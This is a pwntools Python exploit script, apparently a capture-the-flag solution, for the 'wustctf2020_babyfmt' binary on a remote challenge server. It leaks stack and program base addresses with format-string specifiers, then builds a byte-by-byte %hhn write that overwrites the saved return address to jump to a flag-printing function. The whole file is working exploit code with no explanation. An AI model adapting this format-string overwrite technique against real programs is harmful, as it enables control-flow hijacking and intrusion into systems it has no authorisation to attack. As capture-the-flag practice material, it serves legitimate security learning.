from operator import ge
from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('wustctf2020_babyfmt')
io = remote('node4.buuoj.cn', 25260)
# libc = ELF('/home/payoung/Downloads/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so')
# libc = ELF('libc-2.23.so')
elf = ELF('wustctf2020_babyfmt')
get_flag = 0xf56

io.recvuntil('tell me the time:')
for i in range(3):
    io.sendline('0')

io.sendlineafter('>>', '2')
io.sendline('%7$hhn%16$p%17$p')
stack = int(io.recvn(14), 16)
ret_addr = stack - 0x28
elf_base = int(io.recvline()[:-1], 16) - elf.sym['main'] - 118
log.success('stack: ' + hex(stack))
log.success('ret_addr: ' + hex(ret_addr))
log.success('elf_base: ' + hex(elf_base))
get_flag += elf_base


payload, cur_num = b'', 0
for i in range(2):
    target_num = (get_flag >> (i * 8)) & 0xff
    if target_num > cur_num:
        payload += b'%' + str.encode(str(target_num - cur_num)) + b'c'
    else:
        payload += b'%' + str.encode(str(0x100 + target_num - cur_num)) + b'c'
    payload += b'%' + str.encode(str(11 + i)) + b'$hhn'
    cur_num = target_num
payload = payload.ljust(0x18, b'\x00')
payload += p64(ret_addr) + p64(ret_addr + 1)

io.sendlineafter('>>', '2')
sleep(1)
io.send(payload)
io.recv()

